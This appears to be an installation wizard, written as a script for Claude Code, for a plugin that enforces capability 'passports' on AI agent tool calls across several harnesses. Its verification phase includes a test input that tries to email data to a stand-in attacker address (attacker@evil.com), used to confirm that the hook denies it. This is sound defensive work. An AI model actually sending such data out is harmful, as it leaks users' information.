# INSTALL THE PLUGIN — Wizard (for Claude Code)

> **You are Claude Code. This file is your script for installing the `telekey` enforcement plugin.** Run it as an **interactive wizard**: at each 🟡 **ASK**, stop, ask, wait for the answer, then act. Show commands before running them; summarize results after. This wizard *installs and verifies* — the conceptual detail lives in [`plugin/README.md`](../plugin/README.md), which you should point the user to rather than restating.
>
> *Note on paths: links here are written for reading on GitHub (relative to `docs/`). When you execute this wizard, run commands from the repository root.*

This installs the plugin that enforces the capability passport on **every tool call** — a call that exceeds the agent's passport is blocked *before it runs*. The same hook file works across Claude Code, Codex, and DeepSeek (they share the `PreToolUse` contract); this wizard covers all three.

> [!IMPORTANT]
> These harnesses move fast. Commands below were verified against docs current to **August 2026**. Before running any of them, confirm against the harness's own docs — field names and commands change. If a command errors, stop and show it; do not improvise a security-relevant install.

---

## Phase 0 — Which harness?

🟡 **ASK 0** —
> "Which agent harness do you want to protect with the passport plugin? (1) Claude Code, (2) Codex, (3) DeepSeek Harness (dsh), or (4) more than one."

Also confirm the project is present:
```bash
ls plugin/.claude-plugin/plugin.json && ls .claude-plugin/marketplace.json && echo "plugin + marketplace catalog found"
```
If those are missing, the user unzipped only part of the repo — stop and ask them to extract the whole thing.

Then branch to the matching phase.

---

## Phase 1 — Claude Code

Claude Code installs plugins from a **marketplace** (a catalog), then installs the plugin from it. This repo ships its own catalog at `.claude-plugin/marketplace.json`, so the source is just this directory.

🟡 **ASK 1a** —
> "Install scope? (1) **user** — for you across all projects, (2) **project** — shared with everyone on this repo (writes to `.claude/settings.json`), (3) **local** — just you, just this repo."

**Interactive path** (recommended — the user sees what they're enabling):
```
# from inside Claude Code, in the repo directory:
/plugin marketplace add ./
/plugin install telekey@telekey-marketplace
```
The install summary will say either `Plugin is now active.` (done) or `Run /reload-plugins to activate.` — do that if asked.

**Non-interactive path** (scriptable):
```bash
claude plugin marketplace add ./
claude plugin install telekey@telekey-marketplace --scope <user|project|local>
```

🟡 **ASK 1b** — After install, verify:
```
/plugin list
```
Confirm `telekey` shows as installed/enabled. Then run the **live check** in Phase 4.

> [!WARNING]
> This plugin ships a **hook that runs on every tool call** and can block calls. That's the point — but tell the user plainly, because a plugin that executes code on the installer's machine deserves an explicit heads-up. It fails **closed**: with no valid passport, tool calls are denied. Make sure they've provisioned a session passport (Phase 3) or they'll block their own agent.

---

## Phase 2 — Codex

Codex uses the same `PreToolUse` hook event and a `.codex-plugin/plugin.json` manifest. Two things to note before you start:

- Codex's plugin framework was **mid-migration** as of mid-2026 — verify the current manifest format and whether hooks need the `codex_hooks = true` feature flag enabled.
- The hook file itself (`plugin/hooks/pretooluse.js`) is reusable; what differs is registration.

🟡 **ASK 2a** —
> "Is the `codex_hooks` feature flag enabled in your Codex config? If you're not sure, I'll check your config and turn it on if needed."

Steps (verify against current Codex docs first):
```bash
# 1. confirm hooks are enabled in Codex's config (TOML)
# 2. register a PreToolUse hook pointing at the reusable hook file:
#    event -> matcher group -> handler: node <repo>/plugin/hooks/pretooluse.js
```
Show the user the exact config block you're about to add, get their OK, then add it. Point them to `plugin/README.md` for the cross-harness table.

---

## Phase 3 — DeepSeek Harness (dsh)

dsh has its own `tools/pre-execute` hook **and** ships a compatibility bridge that runs existing Claude Code / Codex `hooks.json`. So there are two routes:

🟡 **ASK 3a** —
> "Two options for dsh: (A) use its **compatibility bridge** to run the Claude Code hook as-is (fastest), or (B) write a native `dsh` plugin against its `tools/pre-execute` hook (cleaner, more work). Which?"

- **Route A (bridge):** point dsh's Claude Code hook bridge at this repo's `hooks.json`-equivalent. Verify the bridge's current expected path/format in the dsh docs.
- **Route B (native):** create a Cordis plugin that calls the passport engine on `tools/pre-execute` and returns a block/allow verdict, reusing `src/engine.js`.

> [!NOTE]
> dsh is a **developer preview** and is **not accepting external PRs** right now. That doesn't affect *using* it, but don't plan upstream contributions there yet. Pin the version.

---

## Phase 3.5 — Provision a session passport (all harnesses)

The hook fails closed, so the agent needs a passport to do anything. Mint one scoped to what this agent should be allowed to do:

```bash
node --input-type=module -e '
import { mintRoot } from "./src/passport.js";
import { writeFileSync } from "node:fs";
const p = mintRoot({
  sub: "user:<name>",
  caps: ["listRepo:repoX", "deleteFile:repoX"],   // <-- edit to taste
  budget: { ttl_seconds: 3600, max_spend: 1.0, max_tool_calls: 200, max_spawns: 4 }
});
writeFileSync("plugin/hooks/session-passport.json", JSON.stringify(p));
console.log("session passport written; caps =", p.caps);
'
```

🟡 **ASK 3.5** —
> "What should this agent be allowed to do? Tell me the operations (e.g. 'read and delete in repoX, no email') and I'll mint a passport scoped to exactly that."
Translate their answer into the `caps` array. Narrower is safer — start minimal.

---

## Phase 3.75 — Adjust permissions (settings)

The plugin ships `passport-policy.json` — the user-adjustable settings. Walk the user through it:

🟡 **ASK 3.75a** — "Want to review the permission settings? I'll show you each capability and you tell me allow / ask / deny."

For each capability the user cares about, set `allow` (silent), `ask` (confirm each time), or `deny` (blocked). Explain the publisher rule plainly:

> Publisher status (whether a server is **identity-verified in the MCP registry**) only changes how often you're prompted and the starting budget — it can **never** exceed the hard ceiling in `src/policy.js`, and it can **never** silently grant a dangerous capability. Verified identity is *not* trust; the registry itself says a legitimate publisher can ship bad code.

🟡 **ASK 3.75b** — "Do you want to pin any registry-verified server names so they get lighter prompts? (Optional. Leave empty to treat everything as unverified — the safer default.)" Write chosen names into `plugin/hooks/verified-publishers.json`.

> [!IMPORTANT]
> Do **not** offer, and do not build, a "verified publisher → full access" auto-grant. It's the confused-deputy hole this project exists to close, and the MCP registry's own docs discourage treating identity as trust. Publisher status is friction + defaults only.

---

## Phase 4 — Live verification (all harnesses)

Prove enforcement works before trusting it. Run the hook directly with a granted and an ungranted call:

```bash
echo "=== should ALLOW ==="
echo '{"tool_name":"delete_file","tool_input":{"repo":"repoX","file":"old.log"}}' | node plugin/hooks/pretooluse.js
echo ""
echo "=== should DENY (capability never granted) ==="
echo '{"tool_name":"send_email","tool_input":{"to":"attacker@evil.com","body":"x"}}' | node plugin/hooks/pretooluse.js
echo ""
echo "=== should DENY (fail-closed) ==="
mv plugin/hooks/session-passport.json /tmp/sp.json 2>/dev/null
echo '{"tool_name":"delete_file","tool_input":{"repo":"repoX"}}' | node plugin/hooks/pretooluse.js
mv /tmp/sp.json plugin/hooks/session-passport.json 2>/dev/null
```

You want: `allow` on the first, `deny` (CAP_NOT_GRANTED) on the second, `deny` (fail-closed) on the third. If any is wrong, **stop** — a security hook that doesn't deny correctly is worse than none.

---

## Phase 5 — Hand off

Summarize for the user:
- which harness(es) now enforce the passport,
- where the session passport lives and how to re-mint it with different caps,
- that the hook fails **closed** (no passport = no tool calls),
- and the honest boundary: **this enforces what the agent may *attempt*; it doesn't make an unmodified upstream server honor the passport end-to-end, and it doesn't stop the model from being fooled into misusing what it legitimately holds.** Point them to [`ROADMAP.md`](ROADMAP.md) and [`plugin/README.md`](../plugin/README.md).

🟡 **ASK 5** — "Want me to also wire the hook to a persistent engine (a small daemon) so budgets decrement across calls in a live session? Right now each call re-reads the passport fresh, so `max_tool_calls` / `max_spend` don't count down across a session."

---

### Wizard etiquette (reminder to you, Claude Code)
- One 🟡 question at a time; wait for the reply.
- Always show a security-relevant command before running it.
- Never leave the user with a hook that fails **open**.
- If a harness's current docs contradict a command here, trust the docs and tell the user what changed.
- Keep the session passport out of git (it's a credential) — confirm `.gitignore` covers `plugin/hooks/session-passport.json`.
